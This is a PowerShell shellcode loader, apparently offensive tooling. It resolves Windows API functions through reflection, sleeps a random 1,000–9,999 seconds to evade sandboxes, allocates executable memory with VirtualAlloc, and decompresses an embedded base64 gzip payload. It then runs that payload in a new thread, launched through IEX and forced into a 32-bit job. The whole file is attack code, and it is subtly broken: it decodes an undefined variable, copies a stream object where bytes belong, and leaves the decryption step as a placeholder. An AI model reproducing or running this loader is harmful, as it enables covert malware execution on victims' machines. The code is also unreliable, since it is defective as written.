Set-StrictMode -Version 2

$Hello = @'
function Get-SystemBasedRandomNumber {
    [CmdletBinding()]
    Param(
        [int]$MinValue = 0,
        [int]$MaxValue = [int]::MaxValue
    )

    # Gather system information
    $cpuInfo = Get-CimInstance Win32_Processor | Select-Object -ExpandProperty ProcessorId
    $osVersion = (Get-CimInstance Win32_OperatingSystem).Version
    $systemTime = Get-Date -Format "yyyyMMddHHmmssffff"
    
    # Create a hash from system information
    $hashString = "$cpuInfo$osVersion$systemTime"
    $hashBytes = [System.Text.Encoding]::Unicode.GetBytes($hashString)
    $hashProvider = New-Object System.Security.Cryptography.SHA256Managed
    $hash = $hashProvider.ComputeHash($hashBytes)
    
    # Convert hash bytes to an integer to use as seed
    $seed = [BitConverter]::ToInt32($hash, 0)

    # Seed the random number generator
    $random = New-Object System.Random $seed
    
    # Generate the random number within the specified range
    $randomNumber = $random.Next($MinValue, $MaxValue)

    # Output the random number
    return $randomNumber
}

function LookupFunc {
	Param ($moduleName, $functionName)
	
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
	Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

	 $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}

	 $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }

	return $result;
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
	DefineDynamicAssembly((New-Object
	System.Reflection.AssemblyName('ReflectedDelegate')),
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
	DefineDynamicModule('InMemoryModule', $false).
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

	$type.DefineConstructor('RtSpecialName, HideBySig, Public',
	[System.Reflection.CallingConventions]::Standard, $func).
	SetImplementationFlags('Runtime, Managed')

	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
	SetImplementationFlags('Runtime, Managed')
	
	return $type.CreateType()
}

$randomNumber = Get-SystemBasedRandomNumber -MinValue 1000 -MaxValue 9999
Start-Sleep -Seconds $randomNumber

# VirtualAlloc, returns address to free memory, Invoke(lpAddress=0, size=0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# GZIP Compressed byte array
$enc = "H4sIAAAAAAAACoWMsQrCMBRFd8F/iJkUbD6gWzsIRdQhgoM4xOTVBpK80pfQ5u8NuArdLuceTmNMdc8jsKohAv92+ao8MJkpghcPGwzOJE44edpunv+wuACR+kCLy6uu5YDznks92TEyWECnCIZR0rpYfXIu7/iRcfkDZa412xQjBirp23nd7jSGonahL4eKFsPhCyS1s2niAAAA"

# Gzip Decompression
$data = [System.Convert]::FromBase64String("$compressed")
$ms = New-Object System.IO.MemoryStream($data, 0, $data.Length)
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)

$decompressedStream = New-Object System.IO.MemoryStream 
$buffer = New-Object byte[] 1024 

while (($read = $cs.Read($buffer, 0, 1024)) -gt 0) { 
	$decompressedStream.Write($buffer, 0, $read) 
}

# Cleanup 
$cs.Close() 
$ms.Close() 

$decompressedStream.Position = 0
$decompressedBytes = $decompressedStream.ToArray()

$decompressedStream.Close()

$buf = $decompressedStream

# decryption function here

# Copy shellcode to allocated memory $lpMem
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)

# Create thread and get the handle, Invoke(threadattributes=0, stacksize=0, shellcode address $lpMem, paramter=0, creationflags=0)
$hThread =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc
kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],
[UInt32], [IntPtr])
([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

# WaitForSingleObject DelegateFunction, Invoke(Handle to thread, wait timer)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc
kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])
([Int]))).Invoke($hThread, 0xFFFFFFFF)
'@

If ([IntPtr]::size -eq 8) {
    start-job { param($a) IEX $a } -RunAs32 -Argument $Hello | wait-job | Receive-Job
}
else {
    IEX $Hello
}